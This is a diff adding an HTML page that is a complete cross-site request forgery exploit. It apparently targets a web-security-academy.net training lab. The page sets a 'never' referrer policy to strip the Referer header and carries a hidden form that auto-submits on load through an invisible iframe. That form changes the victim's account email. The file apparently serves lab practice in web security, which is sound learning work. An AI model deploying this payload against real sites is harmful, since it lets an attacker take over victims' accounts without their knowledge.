@@ -1,0 +1,20 @@
+<html>
+    <header>
+    	<meta name="referrer" content="never">
+    </header>
+	<body>
+
+		<h1>Hello World!</h1>
+		<iframe style="dislpay:none" name="csrf-iframe"></iframe>
+		<form action="https://acab1f0b1ede68aac0b2092a007a0088.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form" target="csrf-iframe">
+			<input type="hidden" name="email" value="test2@test.ca">
+		</form>
+		<script>
+			document.getElementById('csrf-form').submit()
+		</script>
+	</body>
+</html>
+
+<!--
+Metadata is not displayed.
+-->
